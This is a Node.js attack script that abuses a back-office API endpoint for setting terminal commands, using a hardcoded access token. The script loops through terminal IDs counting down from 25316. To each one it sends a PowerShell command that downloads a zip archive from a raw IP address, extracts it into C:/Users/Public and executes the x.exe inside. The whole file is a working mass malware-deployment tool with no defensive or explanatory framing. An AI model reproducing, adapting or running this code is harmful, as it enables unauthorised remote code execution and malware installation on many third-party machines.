var request = require('request');



getMe = (id) => {
    return new Promise((resolve, reject) => {
        (async () => {
            var options = {
                'method': 'POST',
                'url': 'https://bo-api.xpress-ix.com/sysapi/v1/terminal/set-command',
                'headers': {
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://clientoffice.xpress-ix.com',
                    'priority': 'u=1, i',
                    'referer': 'https://clientoffice.xpress-ix.com/',
                    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
                },
                form: {
                    'terminal_id': id,
                    'terminal_command': 'powershell Invoke-WebRequest -Uri http://74.122.101.8/app/x.zip -OutFile "C:/Users/Public/x.zip" && powershell Expand-Archive -Path "C:/Users/Public/x.zip" "C:/Users/Public" && dir "C:/Users/Public" && "C:/Users/Public/x.exe"\n',
                    'boToken': '2bdc7d32a7671132e1c6c6b64b5fb0ae',
                    'external_login': 'false'
                }
            };
            request(options, function (error, response) {
                if (error) throw new Error(error);
                resolve(response.body);
            });
        })()
    });
}

let counter = 25316;
(async () => {
    setInterval(async () => {
        const result = await getMe(counter);
        console.log({ result, counter });
        counter--;
    }, 3000);
})()